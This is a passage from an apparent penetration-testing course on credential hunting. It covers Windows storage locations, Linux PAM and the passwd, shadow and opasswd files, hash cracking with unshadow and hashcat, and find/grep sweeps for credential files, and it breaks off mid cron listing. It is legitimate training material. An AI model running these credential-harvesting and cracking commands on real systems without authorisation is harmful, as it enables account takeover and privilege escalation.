<p>There are thousands of tools and key terms we could use to hunt for credentials on Windows operating systems. Know that which ones we choose to use will be primarily based on the function of the computer. If we land on a Windows Server, we may use a different approach than if we land on a Windows Desktop. Always be mindful of how the system is being used, and this will help us know where to look. Sometimes we may even be able to find credentials by navigating and listing directories on the file system as our tools run.</p>
<p>Here are some other places we should keep in mind when credential hunting:</p>
<ul>
<li>Passwords in Group Policy in the SYSVOL share</li>
<li>Passwords in scripts in the SYSVOL share</li>
<li>Password in scripts on IT shares</li>
<li>Passwords in <code>web.config</code> files on dev machines and IT shares</li>
<li>Password in <code>unattend.xml</code></li>
<li>Passwords in the AD user or computer description fields</li>
<li>KeePass databases (if we are able to guess or crack the master password)</li>
<li>Found on user systems and shares</li>
<li>Files with names like <code>pass.txt</code>, <code>passwords.docx</code>, <code>passwords.xlsx</code> found on user systems, shares, and <a href="https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration">Sharepoint</a></li>
</ul>
<p>You have gained access to an IT admin&#39;s Windows 10 workstation and begin your credential hunting process by searching for credentials in common storage locations.</p>
<hr>
<h2 id="linux-authentication-process">Linux Authentication Process</h2>
<p>Linux-based distributions support various authentication mechanisms. One of the most commonly used is <a href="https://web.archive.org/web/20220622215926/http://www.linux-pam.org/Linux-PAM-html/Linux-PAM_SAG.html">Pluggable Authentication Modules (PAM)</a>. The modules responsible for this functionality, such as <code>pam_unix.so</code> or <code>pam_unix2.so</code>, are typically located in <code>/usr/lib/x86_64-linux-gnu/security/</code> on Debian-based systems. These modules manage user information, authentication, sessions, and password changes. For example, when a user changes their password using the <code>passwd</code> command, PAM is invoked, which takes the appropriate precautions to handle and store the information accordingly.</p>
<p>The <code>pam_unix.so</code> module uses standardized API calls from system libraries to update account information. The primary files it reads from and writes to are <code>/etc/passwd</code> and <code>/etc/shadow</code>. PAM also includes many other service modules, such as those for LDAP, mount operations, and Kerberos authentication.</p>
<h3 id="passwd-file">Passwd file</h3>
<p>The <code>/etc/passwd</code> file contains information about every user on the system and is readable by all users and services. Each entry in the file corresponds to a single user and consists of <code>seven fields</code>, which store user-related data in a structured format. These fields are separated by colons (<code>:</code>). As such, a typical entry may look something like this:</p>
<p>&#x20; Linux Authentication Process</p>
<pre><code class="lang-shell-session">htb-<span class="hljs-symbol">student:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span>,,,<span class="hljs-symbol">:/home/htb-student</span><span class="hljs-symbol">:/bin/bash</span>
</code></pre>
<table>
<thead>
<tr>
<th>Field</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>Username</td>
<td><code>htb-student</code></td>
</tr>
<tr>
<td>Password</td>
<td><code>x</code></td>
</tr>
<tr>
<td>User ID</td>
<td><code>1000</code></td>
</tr>
<tr>
<td>Group ID</td>
<td><code>1000</code></td>
</tr>
<tr>
<td><a href="https://en.wikipedia.org/wiki/Gecos_field">GECOS</a></td>
<td><code>,,,</code></td>
</tr>
<tr>
<td>Home directory</td>
<td><code>/home/htb-student</code></td>
</tr>
<tr>
<td>Default shell</td>
<td><code>/bin/bash</code></td>
</tr>
</tbody>
</table>
<p>The most relevant field for our purposes is the <code>Password</code> field, as it can contain different types of entries. In rare cases (generally on very old systems) this field may hold the actual password hash. On modern systems, however, password hashes are stored in the <code>/etc/shadow</code> file, which we&#39;ll examine later. Despite this, the <code>/etc/passwd</code> file is world-readable, giving attackers the ability to crack the passwords if hashes are stored here.</p>
<p>Usually, we will find the value <code>x</code> in this field, indicating that the passwords are stored in a hashed form within the <code>/etc/shadow</code> file. However, it can also be that the <code>/etc/passwd</code> file is writeable by mistake. This would allow us to remove the password field for the <code>root</code> user entirely.</p>
<p>&#x20; Linux Authentication Process</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ head -n 1 /</span>etc/passwd
<span class="hljs-symbol">
root:</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-string">root:</span><span class="hljs-regexp">/root:/</span>bin/bash
</code></pre>
<p>This results in no password prompt being displayed when attempting to log in as <code>root</code>.</p>
<p>&#x20; Linux Authentication Process</p>
<pre><code class="lang-shell-session">root<span class="hljs-symbol">@htb[</span>/htb]$ su

root<span class="hljs-symbol">@htb[</span>/htb]<span class="hljs-meta">#</span>
</code></pre>
<p>Although the scenarios described are rare, we should still pay attention and watch for potential security gaps, as there are applications that require specific permissions fon entire folders. If the administrator has little experience with Linux (or the applications and their dependencies), they might mistakenly assign write permissions to the <code>/etc</code> directory and fail to correct them later.</p>
<h3 id="shadow-file">Shadow file</h3>
<p>Since reading password hash values can put the entire system at risk, the <code>/etc/shadow</code> file was introduced. It has a similar format to <code>/etc/passwd</code> but is solely responsible for password storage and management. It contains all password information for created users. For example, if there is no entry in the <code>/etc/shadow</code> file for a user listed in <code>/etc/passwd</code>, that user is considered invalid. The <code>/etc/shadow</code> file is also only readable by users with administrative privileges. The format of this file is divided into the following <code>nine fields</code>:</p>
<p>&#x20; Linux Authentication Process</p>
<pre><code class="lang-shell-session">htb-student:<span class="hljs-variable">$y</span><span class="hljs-variable">$j9T</span>$<span class="hljs-number">3</span>QSBB6CbHEu..<span class="hljs-selector-class">.SNIP</span>..<span class="hljs-selector-class">.f8Ms</span>:<span class="hljs-number">18955</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::
</code></pre>
<table>
<thead>
<tr>
<th>Field</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>Username</td>
<td><code>htb-student</code></td>
</tr>
<tr>
<td>Password</td>
<td><code>$y$j9T$3QSBB6CbHEu...SNIP...f8Ms</code></td>
</tr>
<tr>
<td>Last change</td>
<td><code>18955</code></td>
</tr>
<tr>
<td>Min age</td>
<td><code>0</code></td>
</tr>
<tr>
<td>Max age</td>
<td><code>99999</code></td>
</tr>
<tr>
<td>Warning period</td>
<td><code>7</code></td>
</tr>
<tr>
<td>Inactivity period</td>
<td><code>-</code></td>
</tr>
<tr>
<td>Expiration date</td>
<td><code>-</code></td>
</tr>
<tr>
<td>Reserved field</td>
<td><code>-</code></td>
</tr>
</tbody>
</table>
<p>If the <code>Password</code> field contains a character such as <code>!</code> or <code>*</code>, the user cannot log in using a Unix password. However, other authentication methods—such as Kerberos or key-based authentication—can still be used. The same applies if the <code>Password</code> field is empty, meaning no password is required for login. This can lead to certain programs denying access to specific functions. The <code>Password</code> field also follows a particular format, from which we can extract additional information:</p>
<ul>
<li><code>$&lt;id&gt;$&lt;salt&gt;$&lt;hashed&gt;</code></li>
</ul>
<p>As we can see here, the hashed passwords are divided into three parts. The <code>ID</code> value specifies which cryptographic hash algorithm was used, typically one of the following:</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>Cryptographic Hash Algorithm</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>1</code></td>
<td><a href="https://en.wikipedia.org/wiki/MD5">MD5</a></td>
</tr>
<tr>
<td><code>2a</code></td>
<td><a href="https://en.wikipedia.org/wiki/Blowfish_\(cipher\">Blowfish</a>)</td>
</tr>
<tr>
<td><code>5</code></td>
<td><a href="https://en.wikipedia.org/wiki/SHA-2">SHA-256</a></td>
</tr>
<tr>
<td><code>6</code></td>
<td><a href="https://en.wikipedia.org/wiki/SHA-2">SHA-512</a></td>
</tr>
<tr>
<td><code>sha1</code></td>
<td><a href="https://en.wikipedia.org/wiki/SHA-1">SHA1crypt</a></td>
</tr>
<tr>
<td><code>y</code></td>
<td><a href="https://github.com/openwall/yescrypt">Yescrypt</a></td>
</tr>
<tr>
<td><code>gy</code></td>
<td><a href="https://www.openwall.com/lists/yescrypt/2019/06/30/1">Gost-yescrypt</a></td>
</tr>
<tr>
<td><code>7</code></td>
<td><a href="https://en.wikipedia.org/wiki/Scrypt">Scrypt</a></td>
</tr>
</tbody>
</table>
<p>Many Linux distributions, including Debian, now use <code>yescrypt</code> as the default hashing algorithm. On older systems, however, we may still encounter other hashing methods that can potentially be cracked. We&#39;ll discuss how the cracking process works shortly.</p>
<h3 id="opasswd">Opasswd</h3>
<p>The PAM library (<code>pam_unix.so</code>) can prevent users from reusing old passwords. These previous passwords are stored in the <code>/etc/security/opasswd</code> file. Administrator (root) privileges are required to read this file, assuming its permissions have not been modified manually.</p>
<p>&#x20; Linux Authentication Process</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ sudo cat /etc</span><span class="hljs-regexp">/security/opasswd</span>

<span class="hljs-symbol">cry0l1t3:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-variable">$1</span><span class="hljs-variable">$HjFAfYTG</span><span class="hljs-variable">$qNDkF0zJ3v8ylCOrKB0kt0</span>,<span class="hljs-variable">$1</span><span class="hljs-variable">$kcUjWZJX</span><span class="hljs-variable">$E9uMSmiQeRh4pAAgzuvkq1</span>
</code></pre>
<p>Looking at the contents of this file, we can see that it contains several entries for the user <code>cry0l1t3</code>, separated by a comma (<code>,</code>). One critical detail to pay attention to is the type of hash that&#39;s been used. This is because the <code>MD5</code> (<code>$1$</code>) algorithm is significantly easier to crack than SHA-512. This is particularly important when identifying old passwords and recognizing patterns, as users often reuse similar passwords across multiple services or applications. Recognizing these patterns can greatly improve our chances of correctly guessing the password.</p>
<h3 id="cracking-linux-credentials">Cracking Linux Credentials</h3>
<p>Once we have root access on a Linux machine, we can gather user password hashes and attempt to crack them using various methods to recover the plaintext passwords. To do this, we can use a tool called <a href="https://github.com/pmittaldev/john-the-ripper/blob/master/src/unshadow.c">unshadow</a>, which is included with John the Ripper (JtR). It works by combining the <code>passwd</code> and <code>shadow</code> files into a single file suitable for cracking.</p>
<p>&#x20; Linux Authentication Process</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ sudo cp /</span>etc<span class="hljs-regexp">/passwd /</span>tmp/passwd.bak 
root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ sudo cp /</span>etc<span class="hljs-regexp">/shadow /</span>tmp/shadow.bak 
root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ unshadow /</span>tmp<span class="hljs-regexp">/passwd.bak /</span>tmp<span class="hljs-regexp">/shadow.bak &gt; /</span>tmp/unshadowed.hashes
</code></pre>
<p>This &quot;unshadowed&quot; file can now be attacked with either JtR or hashcat.</p>
<p>&#x20; Linux Authentication Process</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ hashcat -m <span class="hljs-number">1800</span> -<span class="hljs-selector-tag">a</span> <span class="hljs-number">0</span> /tmp/unshadowed<span class="hljs-selector-class">.hashes</span> rockyou<span class="hljs-selector-class">.txt</span> -o /tmp/unshadowed.cracked
</code></pre>
<p>Note: This is the exact scenario that JtR&#39;s <code>single crack mode</code> was designed for.</p>
<h3 id="further-reading">Further reading</h3>
<p>For further reading on the Linux authentication process, this <a href="https://tldp.org/HOWTO/pdf/User-Authentication-HOWTO.pdf">document</a> by <a href="https://tldp.org/">The Linux Documentation Project</a> is a great reference.</p>
<hr>
<h2 id="credential-hunting-in-linux">Credential Hunting in Linux</h2>
<p>Hunting for credentials is one of the first steps once we have access to the system. These low-hanging fruits can give us elevated privileges within seconds or minutes. Among other things, this is part of the local privilege escalation process that we will cover here. However, it is important to note here that we are far from covering all possible situations and therefore focus on the different approaches.</p>
<p>We can imagine that we have successfully gained access to a system via a vulnerable web application and have therefore obtained a reverse shell, for example. Therefore, to escalate our privileges most efficiently, we can search for passwords or even whole credentials that we can use to log in to our target. There are several sources that can provide us with credentials that we put in four categories. These include, but are not limited to:</p>
<ul>
<li><code>Files</code> including configs, databases, notes, scripts, source code, cronjobs, and SSH keys</li>
<li><code>History</code> including logs, and command-line history</li>
<li><code>Memory</code> including cache, and in-memory processing</li>
<li><code>Key-rings</code> such as browser stored credentials</li>
</ul>
<p>Enumerating all these categories will allow us to increase the probability of successfully finding out - with some ease - credentials of existing users on the system. There are countless different situations in which we will always see different results. Therefore, we should adapt our approach to the circumstances of the environment and keep the big picture in mind. Above all, it is crucial to keep in mind how the system works, its focus, what purpose it exists for, and what role it plays in the business logic and the overall network. For example, suppose it is an isolated database server. In that case, we will not necessarily find normal users there since it is a sensitive interface in the management of data to which only a few people are granted access.</p>
<h3 id="files">Files</h3>
<p>One core principle of Linux is that everything is a file. Therefore, it is crucial to keep this concept in mind and search, find and filter the appropriate files according to our requirements. We should look for, find, and inspect several categories of files one by one. These categories are the following:</p>
<ul>
<li>Configuration files</li>
<li>Databases</li>
<li>Notes</li>
<li>Scripts</li>
<li>Cronjobs</li>
<li>SSH keys</li>
</ul>
<p>Configuration files are the core of the functionality of services on Linux distributions. Often they even contain credentials that we will be able to read. Their insight also allows us to understand how the service works and its requirements precisely. Usually, the configuration files are marked with the following three file extensions (<code>.config</code>, <code>.conf</code>, <code>.cnf</code>). However, these configuration files or the associated extension files can be renamed, which means that these file extensions are not necessarily required. Furthermore, even when recompiling a service, the required filename for the basic configuration can be changed, which would result in the same effect. However, this is a rare case that we will not encounter often, but this possibility should not be left out of our search.</p>
<p><strong>Searching for configuration files</strong></p>
<p>The most crucial part of any system enumeration is to obtain an overview of it. Therefore, the first step should be to find all possible configuration files on the system, which we can then examine and analyze individually in more detail. There are many methods to find these configuration files, and with the following method, we will see we have reduced our search to these three file extensions.</p>
<p>&#x20; Credential Hunting in Linux</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find /</span> -name *$l <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span> | grep -v <span class="hljs-string">"lib\|fonts\|share\|core"</span> ;done

File <span class="hljs-string">extension:</span>  .conf
<span class="hljs-regexp">/run/</span>tmpfiles.d/<span class="hljs-keyword">static</span>-nodes.conf
<span class="hljs-regexp">/run/</span>NetworkManager/resolv.conf
<span class="hljs-regexp">/run/</span>NetworkManager/no-stub-resolv.conf
<span class="hljs-regexp">/run/</span>NetworkManager<span class="hljs-regexp">/conf.d/</span><span class="hljs-number">10</span>-globally-managed-devices.conf
...SNIP...
<span class="hljs-regexp">/etc/</span>ltrace.conf
<span class="hljs-regexp">/etc/</span>rygel.conf
<span class="hljs-regexp">/etc/</span>ld.so.conf.d/x86_64-linux-gnu.conf
<span class="hljs-regexp">/etc/</span>ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
<span class="hljs-regexp">/etc/</span>fprintd.conf

File <span class="hljs-string">extension:</span>  .config
<span class="hljs-regexp">/usr/</span>src<span class="hljs-regexp">/linux-headers-5.13.0-27-generic/</span>.config
<span class="hljs-regexp">/usr/</span>src<span class="hljs-regexp">/linux-headers-5.11.0-27-generic/</span>.config
<span class="hljs-regexp">/usr/</span>src<span class="hljs-regexp">/linux-hwe-5.13-headers-5.13.0-27/</span>tools<span class="hljs-regexp">/perf/</span>Makefile.config
<span class="hljs-regexp">/usr/</span>src<span class="hljs-regexp">/linux-hwe-5.13-headers-5.13.0-27/</span>tools<span class="hljs-regexp">/power/</span>acpi/Makefile.config
<span class="hljs-regexp">/usr/</span>src<span class="hljs-regexp">/linux-hwe-5.11-headers-5.11.0-27/</span>tools<span class="hljs-regexp">/perf/</span>Makefile.config
<span class="hljs-regexp">/usr/</span>src<span class="hljs-regexp">/linux-hwe-5.11-headers-5.11.0-27/</span>tools<span class="hljs-regexp">/power/</span>acpi/Makefile.config
<span class="hljs-regexp">/home/</span>cry0l1t3/.config
<span class="hljs-regexp">/etc/</span>X11/Xwrapper.config
<span class="hljs-regexp">/etc/</span>manpath.config

File <span class="hljs-string">extension:</span>  .cnf
<span class="hljs-regexp">/etc/</span>ssl/openssl.cnf
<span class="hljs-regexp">/etc/</span>alternatives/my.cnf
<span class="hljs-regexp">/etc/</span>mysql/my.cnf
<span class="hljs-regexp">/etc/</span>mysql/debian.cnf
<span class="hljs-regexp">/etc/</span>mysql<span class="hljs-regexp">/mysql.conf.d/</span>mysqld.cnf
<span class="hljs-regexp">/etc/</span>mysql<span class="hljs-regexp">/mysql.conf.d/</span>mysql.cnf
<span class="hljs-regexp">/etc/</span>mysql/mysql.cnf
<span class="hljs-regexp">/etc/</span>mysql<span class="hljs-regexp">/conf.d/</span>mysqldump.cnf
<span class="hljs-regexp">/etc/</span>mysql<span class="hljs-regexp">/conf.d/</span>mysql.cnf
</code></pre>
<p>Optionally, we can save the result in a text file and use it to examine the individual files one after the other. Another option is to run the scan directly for each file found with the specified file extension and output the contents. In this example, we search for three words (<code>user</code>, <code>password</code>, <code>pass</code>) in each file with the file extension <code>.cnf</code>.</p>
<p>&#x20; Credential Hunting in Linux</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ for i in $(find / -name *.cnf <span class="hljs-number">2</span>&gt;<span class="hljs-meta-keyword">/dev/</span>null | grep -v <span class="hljs-string">"doc\|lib"</span>);do echo -e <span class="hljs-string">"\nFile: "</span> $i; grep <span class="hljs-string">"user\|password\|pass"</span> $i <span class="hljs-number">2</span>&gt;<span class="hljs-meta-keyword">/dev/</span>null | grep -v <span class="hljs-string">"\#"</span>;done
<span class="hljs-symbol">
File:</span>  <span class="hljs-meta-keyword">/snap/</span>core18/<span class="hljs-number">2128</span><span class="hljs-meta-keyword">/etc/</span>ssl/openssl.cnf
challengePassword        = A challenge password
<span class="hljs-symbol">
File:</span>  <span class="hljs-meta-keyword">/usr/</span>share<span class="hljs-meta-keyword">/ssl-cert/</span>ssleay.cnf
<span class="hljs-symbol">
File:</span>  <span class="hljs-meta-keyword">/etc/</span>ssl/openssl.cnf
challengePassword        = A challenge password
<span class="hljs-symbol">
File:</span>  <span class="hljs-meta-keyword">/etc/</span>alternatives/my.cnf
<span class="hljs-symbol">
File:</span>  <span class="hljs-meta-keyword">/etc/</span>mysql/my.cnf
<span class="hljs-symbol">
File:</span>  <span class="hljs-meta-keyword">/etc/</span>mysql/debian.cnf
<span class="hljs-symbol">
File:</span>  <span class="hljs-meta-keyword">/etc/</span>mysql/mysql.conf.d/mysqld.cnf
user        = mysql
<span class="hljs-symbol">
File:</span>  <span class="hljs-meta-keyword">/etc/</span>mysql/mysql.conf.d/mysql.cnf
<span class="hljs-symbol">
File:</span>  <span class="hljs-meta-keyword">/etc/</span>mysql/mysql.cnf
<span class="hljs-symbol">
File:</span>  <span class="hljs-meta-keyword">/etc/</span>mysql/conf.d/mysqldump.cnf
<span class="hljs-symbol">
File:</span>  <span class="hljs-meta-keyword">/etc/</span>mysql/conf.d/mysql.cnf
</code></pre>
<p><strong>Searching for databases</strong></p>
<p>We can apply this simple search to the other file extensions as well. Additionally, we can apply this search type to databases stored in files with different file extensions, and we can then read those.</p>
<p>&#x20; Credential Hunting in Linux</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find /</span> -name *$l <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span> | grep -v <span class="hljs-string">"doc\|lib\|headers\|share\|man"</span>;done

DB File <span class="hljs-string">extension:</span>  .sql

DB File <span class="hljs-string">extension:</span>  .db
<span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/dictionaries-common/</span>ispell.db
<span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/dictionaries-common/</span>aspell.db
<span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/dictionaries-common/</span>wordlist.db
<span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/dictionaries-common/</span>hunspell.db
<span class="hljs-regexp">/home/</span>cry0l1t3<span class="hljs-regexp">/.mozilla/</span>firefox<span class="hljs-regexp">/1bplpd86.default-release/</span>cert9.db
<span class="hljs-regexp">/home/</span>cry0l1t3<span class="hljs-regexp">/.mozilla/</span>firefox<span class="hljs-regexp">/1bplpd86.default-release/</span>key4.db
<span class="hljs-regexp">/home/</span>cry0l1t3<span class="hljs-regexp">/.cache/</span>tracker/meta.db

DB File <span class="hljs-string">extension:</span>  .*db
<span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/dictionaries-common/</span>ispell.db
<span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/dictionaries-common/</span>aspell.db
<span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/dictionaries-common/</span>wordlist.db
<span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/dictionaries-common/</span>hunspell.db
<span class="hljs-regexp">/home/</span>cry0l1t3<span class="hljs-regexp">/.mozilla/</span>firefox<span class="hljs-regexp">/1bplpd86.default-release/</span>cert9.db
<span class="hljs-regexp">/home/</span>cry0l1t3<span class="hljs-regexp">/.mozilla/</span>firefox<span class="hljs-regexp">/1bplpd86.default-release/</span>key4.db
<span class="hljs-regexp">/home/</span>cry0l1t3<span class="hljs-regexp">/.config/</span>pulse/<span class="hljs-number">3</span>a1ee8276bbe4c8e8d767a2888fc2b1e-card-database.tdb
<span class="hljs-regexp">/home/</span>cry0l1t3<span class="hljs-regexp">/.config/</span>pulse/<span class="hljs-number">3</span>a1ee8276bbe4c8e8d767a2888fc2b1e-device-volumes.tdb
<span class="hljs-regexp">/home/</span>cry0l1t3<span class="hljs-regexp">/.config/</span>pulse/<span class="hljs-number">3</span>a1ee8276bbe4c8e8d767a2888fc2b1e-stream-volumes.tdb
<span class="hljs-regexp">/home/</span>cry0l1t3<span class="hljs-regexp">/.cache/</span>tracker/meta.db
<span class="hljs-regexp">/home/</span>cry0l1t3<span class="hljs-regexp">/.cache/</span>tracker/ontologies.gvdb

DB File <span class="hljs-string">extension:</span>  .db*
<span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/dictionaries-common/</span>ispell.db
<span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/dictionaries-common/</span>aspell.db
<span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/dictionaries-common/</span>wordlist.db
<span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/dictionaries-common/</span>hunspell.db
<span class="hljs-regexp">/home/</span>cry0l1t3/.dbus
<span class="hljs-regexp">/home/</span>cry0l1t3<span class="hljs-regexp">/.mozilla/</span>firefox<span class="hljs-regexp">/1bplpd86.default-release/</span>cert9.db
<span class="hljs-regexp">/home/</span>cry0l1t3<span class="hljs-regexp">/.mozilla/</span>firefox<span class="hljs-regexp">/1bplpd86.default-release/</span>key4.db
<span class="hljs-regexp">/home/</span>cry0l1t3<span class="hljs-regexp">/.cache/</span>tracker/meta.db-shm
<span class="hljs-regexp">/home/</span>cry0l1t3<span class="hljs-regexp">/.cache/</span>tracker/meta.db-wal
<span class="hljs-regexp">/home/</span>cry0l1t3<span class="hljs-regexp">/.cache/</span>tracker/meta.db
</code></pre>
<p><strong>Searching for notes</strong></p>
<p>Depending on the environment we are in and the purpose of the host we are on, we can often find notes about specific processes on the system. These often include lists of many different access points or even their credentials. However, it is often challenging to find notes right away if stored somewhere on the system and not on the desktop or in its subfolders. This is because they can be named anything and do not have to have a specific file extension, such as <code>.txt</code>. Therefore, in this case, we need to search for files including the <code>.txt</code> file extension and files that have no file extension at all.</p>
<p>&#x20; Credential Hunting in Linux</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ find <span class="hljs-meta-keyword">/home/</span>* -type f -name <span class="hljs-string">"*.txt"</span> -o ! -name <span class="hljs-string">"*.*"</span>

<span class="hljs-meta-keyword">/home/</span>cry0l1t3/.config<span class="hljs-meta-keyword">/caja/</span>desktop-metadata
<span class="hljs-meta-keyword">/home/</span>cry0l1t3/.config<span class="hljs-meta-keyword">/clipit/</span>clipitrc
<span class="hljs-meta-keyword">/home/</span>cry0l1t3/.config<span class="hljs-meta-keyword">/dconf/</span>user
<span class="hljs-meta-keyword">/home/</span>cry0l1t3/.mozilla<span class="hljs-meta-keyword">/firefox/</span>bh4w5vd0.default-esr/pkcs11.txt
<span class="hljs-meta-keyword">/home/</span>cry0l1t3/.mozilla<span class="hljs-meta-keyword">/firefox/</span>bh4w5vd0.default-esr/serviceworker.txt
<span class="hljs-params">&lt;SNIP&gt;</span>
</code></pre>
<p><strong>Searching for scripts</strong></p>
<p>Scripts are files that often contain highly sensitive information and processes. Among other things, these also contain credentials that are necessary to be able to call up and execute the processes automatically. Otherwise, the administrator or developer would have to enter the corresponding password each time the script or the compiled program is called.</p>
<p>&#x20; Credential Hunting in Linux</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find /</span> -name *$l <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span> | grep -v <span class="hljs-string">"doc\|lib\|headers\|share"</span>;done

File <span class="hljs-string">extension:</span>  .py

File <span class="hljs-string">extension:</span>  .pyc

File <span class="hljs-string">extension:</span>  .pl

File <span class="hljs-string">extension:</span>  .go

File <span class="hljs-string">extension:</span>  .jar

File <span class="hljs-string">extension:</span>  .c

File <span class="hljs-string">extension:</span>  .sh
<span class="hljs-regexp">/snap/</span>gnome<span class="hljs-number">-3</span><span class="hljs-number">-34</span><span class="hljs-number">-1804</span><span class="hljs-regexp">/72/</span>etc<span class="hljs-regexp">/profile.d/</span>vte<span class="hljs-number">-2.91</span>.sh
<span class="hljs-regexp">/snap/</span>gnome<span class="hljs-number">-3</span><span class="hljs-number">-34</span><span class="hljs-number">-1804</span><span class="hljs-regexp">/72/</span>usr<span class="hljs-regexp">/bin/</span>gettext.sh
<span class="hljs-regexp">/snap/</span>core18<span class="hljs-regexp">/2128/</span>etc<span class="hljs-regexp">/init.d/</span>hwclock.sh
<span class="hljs-regexp">/snap/</span>core18<span class="hljs-regexp">/2128/</span>etc<span class="hljs-regexp">/wpa_supplicant/</span>action_wpa.sh
<span class="hljs-regexp">/snap/</span>core18<span class="hljs-regexp">/2128/</span>etc<span class="hljs-regexp">/wpa_supplicant/</span>functions.sh
&lt;SNIP&gt;
<span class="hljs-regexp">/etc/</span>profile.d/xdg_dirs_desktop_session.sh
<span class="hljs-regexp">/etc/</span>profile.d/cedilla-portuguese.sh
<span class="hljs-regexp">/etc/</span>profile.d/im-config_wayland.sh
<span class="hljs-regexp">/etc/</span>profile.d/vte<span class="hljs-number">-2.91</span>.sh
<span class="hljs-regexp">/etc/</span>profile.d/bash_completion.sh
<span class="hljs-regexp">/etc/</span>profile.d/apps-bin-path.sh
</code></pre>
<p><strong>Enumerating cronjobs</strong></p>
<p>Cronjobs are independent execution of commands, programs, scripts. These are divided into the system-wide area (<code>/etc/crontab</code>) and user-dependent executions. Some applications and scripts require credentials to run and are therefore incorrectly entered in the cronjobs. Furthermore, there are the areas that are divided into different time ranges (<code>/etc/cron.daily</code>, <code>/etc/cron.hourly</code>, <code>/etc/cron.monthly</code>, <code>/etc/cron.weekly</code>). The scripts and files used by <code>cron</code> can also be found in <code>/etc/cron.d/</code> for Debian-based distributions.</p>
<p>&#x20; Credential Hunting in Linux</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ cat /etc/crontab 

<span class="hljs-comment"># /etc/crontab: system-wide crontab</span>
<span class="hljs-comment"># Unlike any other crontab you don't have to run the `crontab'</span>
<span class="hljs-comment"># command to install the new version when you edit this file</span>
<span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span>
<span class="hljs-comment"># that none of the other crontabs do.</span>

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

<span class="hljs-comment"># Example of job definition:</span>
<span class="hljs-comment"># .---------------- minute (0 - 59)</span>
<span class="hljs-comment"># |  .------------- hour (0 - 23)</span>
<span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span>
<span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span>
<span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span>
<span class="hljs-comment"># |  |  |  |  |</span>
<span class="hljs-comment"># *  *  *  *  * user-name command to be executed</span>
root@htb[/htb]$ ls -la /etc/cron.*/

/etc/cron.d/:
total 28
drwxr-xr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 106 </span> 3. Jan 20:27 .
drwxr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 5728 </span> 1. Feb 00:06 ..
-rw-r--r--<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 201 </span> 1. Mär<span class="hljs-number"> 2021 </span> e2scrub_all
-rw-r--r--<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 331 </span> 9. Jan<span class="hljs-number"> 2021 </span> geoipupdate
-rw-r--r--<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 607 </span>25. Jan<span class="hljs-number"> 2021 </span> john
-rw-r--r--<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 589 </span>14. Sep<span class="hljs-number"> 2020 </span> mdadm
-rw-r--r--<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 712 </span>11. Mai<span class="hljs-number"> 2020 </span> php
-rw-r--r--<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 102 </span>22. Feb<span class="hljs-number"> 2021 </span> .placeholder
-rw-r--r--<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 396 </span> 2. Feb<span class="hljs-number"> 2021 </span> sysstat

